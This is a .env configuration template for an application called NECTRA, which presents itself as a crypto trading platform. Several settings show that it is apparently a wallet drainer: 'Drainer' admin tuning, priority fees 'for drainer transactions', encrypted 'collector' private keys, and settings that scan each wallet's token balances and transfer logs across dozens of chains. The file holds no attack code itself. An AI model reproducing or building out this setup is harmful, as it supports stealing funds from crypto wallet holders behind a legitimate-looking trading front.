# Copy to .env and adjust. Everything is optional for local development.
# Values are read once at boot. Drainer tuning lives in Admin → Drainer, not here.

# --- server ---
PORT=3000
HOST=127.0.0.1
PUBLIC_URL=http://localhost:3000
RELOAD=0
TRUST_PROXY=0               # 1 behind nginx/ALB so rate limits see the real client IP
COOKIE_SECURE=0             # 1 when served over HTTPS (required for wallets + push in prod)
BACKUP_KEEP_DAYS=14         # daily verified backups under data/backups/
LOG_REQUESTS=0

# CORS. Credentials are enabled, so origins must be explicit — "*" is not allowed.
# CORS_ORIGINS=https://app.example.com,https://admin.example.com
# CORS_REGEX=https://.*\.example\.com

# --- secrets ---
# 64 hex chars or base64, decoding to 32 bytes. Encrypts collector keys.
# Losing it loses every encrypted key. Dev: auto-generated at data/master.key
# MASTER_KEY=

# Optional: seed collector keys from env on first boot (imported once, then stored encrypted)
# SOLANA_COLLECTOR_SECRET=   # base58 secret or JSON byte array
# EVM_COLLECTOR_KEY=         # 0x-prefixed 32-byte private key
# TRON_COLLECTOR_KEY=        # 32-byte hex private key

# --- first-run accounts (only when no admin exists) ---
ADMIN_EMAIL=admin@nectra.local
# ADMIN_PASSWORD=            # random if omitted; printed + saved to data/first-run-credentials.txt
DEMO_PASSWORD=Demo-Trader-2026

# --- demo mode ---
DEMO_MODE=1

# --- AI Copilot ---
# ANTHROPIC_API_KEY=
# COPILOT_MODEL=claude-opus-5-5

# --- market data ---
# PRICE_FEED=sim
# PYTH_API_KEY=
# COINGECKO_API_KEY=
# CANDLES_API=https://data-api.binance.vision/api/v3/klines

# --- Solana ---
SOLANA_RPC=https://api.mainnet-beta.solana.com
SOLANA_CLUSTER=mainnet-beta
# SOLANA_PRIORITY_FEE=50000   # micro-lamports per CU for drainer transactions
# JUPITER_API=https://lite-api.jup.ag/swap/v1

# --- EVM ---
# One override per chain. Public fallbacks are used when unset, but log scans
# need a real endpoint. Chain names are normalised: RPC_ETHEREUM, RPC_BASE,
# RPC_ARBITRUM, RPC_OPTIMISM, RPC_POLYGON, RPC_BSC, RPC_AVALANCHE, RPC_LINEA,
# RPC_SCROLL, RPC_ZKSYNC, RPC_MANTLE, RPC_GNOSIS, RPC_CELO, RPC_FANTOM,
# RPC_BERACHAIN, RPC_SONIC, RPC_UNICHAIN, RPC_WORLDCHAIN, RPC_HYPEREVM,
# RPC_MODE, RPC_OPBNB, RPC_SEPOLIA, RPC_BASESEPOLIA, RPC_ARBITRUMSEPOLIA.
# RPC_ETHEREUM=
# RPC_BASE=
# RPC_ARBITRUM=
# RPC_BSC=
# RPC_POLYGON=
# ALCHEMY_KEY=               # enables alchemy_getTokenBalances for full discovery
# EVM_INCLUDE_TESTNETS=0      # 1 to scan testnets by default
# EVM_LOG_CHUNKS=             # transfer-log depth (5000-block chunks) for every chain
# EVM_LOG_CONCURRENCY=12      # concurrent eth_getLogs requests across all chains
# EVM_RPC_CONCURRENCY=8       # concurrent RPC calls (publicnode throttles per IP)
# EVM_SCAN_CONCURRENCY=6      # chains scanned in parallel per wallet
# EVM_SCAN_TIMEOUT=45         # seconds per chain before the scan is abandoned

# --- Tron ---
# TRON_RPC=https://api.trongrid.io
# TRON_API_KEY=

# --- BTC / LTC collateral escrow (watch-only) ---
# BTC_COLLATERAL_XPUB=
# LTC_COLLATERAL_XPUB=
# BTC_ESPLORA=https://blockstream.info/api
# LTC_ESPLORA=https://litecoinspace.org/api

# --- web push ---
# VAPID_SUBJECT=mailto:you@yourdomain.com
# VAPID_PUBLIC_KEY=
# VAPID_PRIVATE_KEY=

# --- email ---
# SMTP_HOST=smtp.example.com
# SMTP_PORT=587
# SMTP_USER=
# SMTP_PASS=
# MAIL_FROM=NECTRA <no-reply@yourdomain.com>

# --- storage ---
# DB_PATH=./data/nectra.db